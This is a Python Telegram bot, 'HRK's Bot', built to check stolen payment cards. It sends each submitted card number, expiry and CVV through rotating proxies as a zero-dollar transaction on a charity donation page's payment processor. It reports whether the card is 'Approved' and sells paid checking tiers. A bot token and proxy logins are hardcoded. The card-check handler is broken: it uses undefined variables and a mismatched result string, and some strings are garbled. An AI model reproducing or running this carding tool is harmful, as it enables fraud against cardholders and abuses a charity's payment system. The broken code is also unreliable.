import requests
from bs4 import BeautifulSoup
import telebot
import time
import threading
from datetime import datetime, timedelta
import os
import json
import re
import random

# Initialize Telegram bot
bot = telebot.TeleBot("7195510626:AAHdF4spBrcmWPPx9-1gogU1yKM1Rs5qe-s")

# Configuration
OWNER_ID = 6460703454
USER_DATA_FILE = "user_data.json"
PROXIES = [
    "node1.veilpro.tech:6000:IoyTYu:K4NwIV",
    "node1.veilpro.tech:6000:e0TSaD:B6cEuH"
]

# Initialize user data
if not os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump({"premium_users": {}, "free_users": {}}, f)

# Load/save user data functions
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {"premium_users": {}, "free_users": {}}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Proxy management
def get_random_proxy():
    if not PROXIES:
        return None
    proxy = random.choice(PROXIES)
    parts = proxy.split(':')
    return {
        'http': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
        'https': f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    }

# Payment processing core
def process_payment(card_number, exp_month, exp_year, cvv):
    proxy = get_random_proxy()
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)

    try:
        exp_year = exp_year[-2:] if len(exp_year) == 4 else exp_year
        if len(exp_year) != 2:
            raise ValueError("Invalid expiration year format")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': 'https://www.womensurgeons.org/'
        }
        response = session.get("https://donate.givedirect.org?cid=15724", headers=headers, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']

        payload = {
            'origin': '1',
            'merchant': 'p1_mer_669021f7e934f033d1bc84f',
            'type': '2',
            'total': '0',
            'description': 'donate live site, p1_tss_67dc2d794c04afc058f2557',
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': '',
            'last': 'Tech'
        }
        headers['txnsessionkey'] = txnsession_key
        response = session.post("https://api.payrix.com/txns", data=payload, headers=headers, timeout=10)
        data = response.json()

        if data.get('response', {}).get('errors'):
            error_msg = data['response']['errors'][0]['msg']
            if "blocked from accessing this form" in error_msg:
                return "𝐑𝐈𝐒𝐊𝐘! 𝐑𝐄𝐓𝐑𝐘 𝐓𝐇𝐈𝐒 𝐁𝐈𝐍 𝐋𝐀𝐓𝐄𝐑"
            return error_msg
        return "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    
    except requests.RequestException as e:
        return f"𝐄𝐫𝐫𝐨𝐫: 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐢𝐬𝐬𝐮𝐞 - {str(e)}"
    except Exception as e:
        return f"𝐄𝐫𝐫𝐨𝐫: {str(e)}"

# BIN information lookup
def get_bin_info(card_number):
    try:
        response = requests.get(f"https://api.juspay.in/cardbins/{card_number[:6]}", timeout=5)
        data = response.json()
        return {
            'brand': data.get('brand', 'Unknown'),
            'type': data.get('type', 'Unknown'),
            'bank': data.get('bank', 'Unknown'),
            'country': data.get('country', 'Unknown')
        }
    except:
        return {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown', 'country': 'Unknown'}

# Rate limiting system
PLANS = {
    "1": {"name": "Basic", "cooldown": 15, "limit": 50},
    "2": {"name": "Mid-Tier", "cooldown": 13, "limit": 100},
    "3": {"name": "Premium", "cooldown": 7, "limit": 150}
}
FREE_COOLDOWN = 30
FREE_LIMIT = 10

def check_limits(user_id):
    user_data = load_user_data()
    now = datetime.now()
    
    if user_id == OWNER_ID:
        return True, None
    
    if str(user_id) in user_data['premium_users']:
        plan = PLANS[user_data['premium_users'][str(user_id)]['plan_id']]
        last_check = user_data['premium_users'][str(user_id)].get('last_check', 0)
        checks = [t for t in user_data['premium_users'][str(user_id)].get('checks', []) 
                 if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
        
        if len(checks) >= plan['limit']:
            return False, "𝐇𝐨𝐮𝐫𝐥𝐲 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝"
        if time.time() - last_check < plan['cooldown']:
            return False, f"𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {plan['cooldown'] - int(time.time() - last_check)}𝐬"
        
        user_data['premium_users'][str(user_id)]['last_check'] = time.time()
        user_data['premium_users'][str(user_id)]['checks'] = checks + [now.isoformat()]
        save_user_data(user_data)
        return True, None
    
    else:
        user_info = user_data['free_users'].get(str(user_id), {})
        last_check = user_info.get('last_check', 0)
        checks = [t for t in user_info.get('checks', []) 
                 if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
        
        if len(checks) >= FREE_LIMIT:
            return False, "𝐅𝐫𝐞𝐞 𝐡𝐨𝐮𝐫𝐥𝐲 𝐥𝐢𝐦𝐢𝐭 𝐫𝐞𝐚𝐜𝐡𝐞𝐝"
        if time.time() - last_check < FREE_COOLDOWN:
            return False, f"𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {FREE_COOLDOWN - int(time.time() - last_check)}𝐬"
        
        user_data['free_users'][str(user_id)] = {
            'last_check': time.time(),
            'checks': checks + [now.isoformat()]
        }
        save_user_data(user_data)
        return True, None

# Loading animation
def update_loading_bar(chat_id, message_id, start_time, done_event):
    bar_length = 20
    stages = ["𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐩𝐚𝐲𝐦𝐞𝐧𝐭...", "𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐁𝐈𝐍 𝐢𝐧𝐟�{o...", "𝐅𝐢𝐧𝐚𝐥𝐢𝐳𝐢𝐧𝐠..."]
    while not done_event.is_set():
        elapsed = time.time() - start_time
        if elapsed > 15:
            break
        progress = min(int((elapsed / 10) * 100), 100)
        bar = "█" * int(bar_length * progress/100) + "░" * (bar_length - int(bar_length * progress/100))
        stage = stages[min(int(elapsed/5), len(stages)-1)]
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{stage}\n[{bar}] {progress}%\n𝐄𝐥𝐚𝐩𝐬𝐞𝐝: {elapsed:.1f}𝐬"
            )
        except:
            pass
        time.sleep(0.5)

# Command handlers
@bot.message_handler(commands=['start', 'START', '.start', '!start'])
def handle_start(message):
    response = (
        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗛𝗥𝗞'𝘀 𝗕𝗼𝘁, {message.from_user.first_name}!\n\n"
        f"⚡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        f"📌 /𝗵𝗿𝗸 𝗰𝗮𝗿𝗱|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩 - 𝗖𝗵𝗲𝗰𝗸 𝗰𝗮𝗿𝗱\n"
        f"📌 /𝗶𝗻𝗳𝗼 - 𝗣𝗹𝗮𝗻 𝗶𝗻𝗳𝗼\n"
        f"🚀 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗣𝗹𝗮𝗻𝘀:\n"
        f"🔹 𝗕𝗮𝘀𝗶𝗰: 𝟭𝟱𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟱𝟬/𝗵𝗿\n"
        f"🔹 𝗠𝗶𝗱-𝗧𝗶𝗲𝗿: 𝟭𝟯𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬𝟬/𝗵𝗿\n"
        f"🔹 𝗧𝗼𝗽-𝗧𝗶𝗲𝗿: 𝟳𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟱𝟬/𝗵𝗿\n"
        f"🔄 𝗙𝗿𝗲𝗲: 𝟯𝟬𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻, 𝟭𝟬/𝗵𝗿"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['info', 'INFO', '.info', '!info'])
def handle_info(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    now = datetime.now()

    if int(user_id) == OWNER_ID:
        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: 𝗢𝘄𝗻𝗲𝗿 (𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀 🚀)\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗡𝗼𝗻𝗲\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝗲\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: 𝗡𝗼𝘁 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝗯𝗹𝗲"
        )
    elif user_id in user_data["premium_users"]:
        user_info = user_data["premium_users"][user_id]
        plan = PLANS[user_info["plan_id"]]
        checks = user_info.get("checks", [])
        valid_checks = [t for t in checks if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
        remaining = max(plan["limit"] - len(valid_checks), 0)
        reset_time = str((datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1) - now).seconds // 60) + " 𝐦𝐢𝐧" if valid_checks else "𝐍𝐨𝐰"
        
        response = (
            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 {user_id}\n"
            f"📛 𝗣𝗹𝗮𝗻: {plan['name']}\n"
            f"⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"🚀 𝗛𝗼𝘂𝗿𝗹𝘆 𝗟𝗶𝗺𝗶𝘁: {hourly_limit}\n"
            f"✅ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗵𝗲𝗰𝗸𝘀: {remaining_checks}\n"
            f"🔄 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝘀𝗲𝘁𝘀 𝗜𝗻: {time_until_reset}"
        )
    
    else:
        user_info = user_data["free_users"].get(user_id, {})
        checks = user_info.get("checks", [])
        valid_checks = [t for t in checks if (now - datetime.fromisoformat(t)).total_seconds() < 3600]
        remaining = max(FREE_LIMIT - len(valid_checks), 0)
        reset_time = str((datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1) - now).seconds // 60) + " 𝐦𝐢�{n" if valid_checks else "𝐍𝐨𝐰"
        
        response = (
            f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨: {user_id}\n"
            f"📛 𝐏𝐥𝐚𝐧: 𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫\n"
            f"⏳ 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {FREE_COOLDOWN}𝐬\n"
            f"🚀 𝐇𝐨𝐮𝐫𝐥𝐲 𝐋𝐢𝐦𝐢𝐭: {FREE_LIMIT}\n"
            f"✅ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐬: {remaining}\n"
            f"🔄 𝐋𝐢𝐦𝐢𝐭 𝐑𝐞𝐬𝐞𝐭𝐬 𝐈𝐧: {reset_time}"
        )
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan', 'PLAN', '.plan', '!plan'])
def handle_plan(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "🚫 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.")
        return
    
    try:
        _, user_id, plan_id = message.text.split()
        user_id = str(int(user_id))
        if plan_id not in PLANS:
            bot.reply_to(message, f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐥𝐚𝐧 𝐈𝐃. 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {', '.join(PLANS.keys())}")
            return
        
        user_data = load_user_data()
        user_data["premium_users"][user_id] = {"plan_id": plan_id, "last_check": 0, "checks": []}
        save_user_data(user_data)
        bot.reply_to(message, f"✅ 𝐔𝐬𝐞𝐫 {user_id} 𝐚𝐬𝐬𝐢𝐠𝐧𝐞𝐝 𝐭𝐨 {PLANS[plan_id]['name']} (𝐏𝐥𝐚𝐧 {plan_id})")
    except ValueError:
        bot.reply_to(message, "ℹ️ 𝐔𝐬𝐚𝐠𝐞: /𝐩𝐥𝐚𝐧 𝐮𝐬𝐞𝐫_𝐢𝐝 𝐩𝐥𝐚𝐧_𝐢𝐝")

@bot.message_handler(func=lambda m: re.match(r'^[!./]?hrk\b', m.text.lower()))
def handle_hrk(message):
    try:
        match = re.search(r'(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3})', message.text)
        if not match:
            return bot.reply_to(message, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐟𝐨𝐫𝐦𝐚𝐭! 𝐔𝐬𝐞: /𝐡𝐫𝐤 𝟒𝟗𝟐𝟗𝟒𝟗𝟖𝟒𝟕𝟏𝟗𝟒𝟗𝟎𝟎𝟒|𝟎𝟒|𝟐𝟗|𝟒𝟔𝟖")
        
        card, month, year, cvv = match.groups()
        month = month.zfill(2)
        year = year[-2:] if len(year) == 4 else year

        allowed, reason = check_limits(message.from_user.id)
        if not allowed:
            return bot.reply_to(message, f"⏳ {reason}")

        start_time = time.time()
        done_event = threading.Event()
        msg = bot.reply_to(message, "⏳ 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠...")
        
        threading.Thread(
            target=update_loading_bar,
            args=(message.chat.id, msg.message_id, start_time, done_event)
        ).start()

        result = process_payment(card, month, year, cvv)
        bin_info = get_bin_info(card)
        elapsed = f"{time.time()-start_time:.2f}𝐬"

           
        if response_msg == "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅":
            response = (
                f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n"
                f"𝗖𝗖 ⇾ {card_number}|{exp_month}|{exp_year}|{cvv}\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 𝗛𝗥𝗞'𝗦 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗔𝗨𝗧𝗛\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}\n\n"
                f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
                f"𝗕𝗮𝗻𝗸: {bin_info['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']}\n\n"
                f"𝗧𝗼𝗼𝗸 {time_taken}"
            )
        else:
            response = (
                f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n"
                f"𝗖𝗖 ⇾ {card_number}|{exp_month}|{exp_year}|{cvv}\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 𝗛𝗥𝗞'𝗦 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗔𝗨𝗧𝗛\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}\n\n"
                f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
                f"𝗕𝗮𝗻𝗸: {bin_info['bank']}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']}\n\n"
                f"𝗧𝗼𝗼𝗸 {time_taken}"
            )
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_message.message_id, text=response)
    
    except Exception as e:
        done_event.set()  # Safe to call since it's initialized outside
        bot.reply_to(message, "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        print(f"Error processing command from user {user_id}: {str(e)}")
# Start bot
print("🟢 Bot is running...")
bot.polling()
